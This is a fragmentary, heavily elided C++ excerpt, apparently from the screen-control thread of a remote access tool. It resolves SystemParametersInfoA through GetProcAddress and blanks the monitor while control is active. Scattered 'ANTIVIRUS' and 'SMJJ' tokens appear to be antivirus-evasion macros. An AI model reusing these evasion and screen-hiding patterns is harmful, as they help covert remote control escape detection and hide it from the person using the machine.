...
DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
{
	...
	typedef BOOL(WINAPI *SystemParametersInfoT) (UINT,UINT,PVOID,UINT);
	SystemParametersInfoT pSystemParametersInfo=(SystemParametersInfoT)GetProcAddress(hModule,"SystemParametersInfoA");
...
SMJJ
		...
		{
			ANTIVIRUS
			pSystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			ANTIVIRUS
		...
		else
		{
			if (bIsScreenBlanked)
			{
				pSystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
